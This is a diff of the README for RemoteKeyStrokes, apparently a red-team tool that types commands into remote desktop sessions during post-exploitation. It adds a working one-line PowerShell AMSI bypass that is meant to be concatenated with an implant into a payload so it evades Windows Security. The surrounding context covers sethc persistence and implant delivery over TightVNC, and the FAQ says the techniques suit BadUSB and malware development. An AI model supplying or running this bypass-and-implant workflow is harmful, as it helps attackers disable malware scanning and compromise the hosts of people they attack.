@@ -6,7 +6,7 @@ A script to automate keystrokes through an active remote desktop session that as
 
 ## About RemoteKeyStrokes
 
-All credits goes to [nopernik](https://github.com/nopernik) for making it possible so I took it upon myself to improve it. I wanted something that helps during the post exploitation phase when executing commands through a remote desktop.
+All credits goes to [nopernik](https://github.com/nopernik) for making it possible so I took it upon myself to improve it. I wanted something that helps during the post exploitation phase when executing commands through a remote desktop. It was also possible for making the [SCPA project](https://github.com/U53RW4R3/SCPA/tree/main/SCPA%20Phases) for collecting resources in a organized matter.
 
 ## Features
 
@@ -389,10 +389,11 @@ $ rks -m persistence -s sethc
 
 Note: WIP (Work In Progress)
 
-- You can combine AMSI Bypass with the powershell implant to circumvent **Windows Security** or any security solution that was integrated with AMSI scanner.
+You can combine [AMSI Bypass](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) with the powershell implant to circumvent **Windows Security** or any security solution that was integrated with AMSI scanner.
 
 ```
 $ cat amsi_bypass.ps1
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
 $ cat amsi_bypass.ps1 implant.ps1 > payload.ps1
 
@@ -431,11 +432,9 @@ $ rks -c implant.ps1 -w tightvnc
 
 ### 0x09 - FAQ
 
-TODO: Fill this info
+#### Can I use the techniques for my project or craft my own arsenal?
 
-Q)
-
-A) The techniques are common and can be reused for BadUSB or malware development.
+The techniques are common and can be reused for BadUSB, malware development, or other projects related.
 
 ## Troubleshooting
 
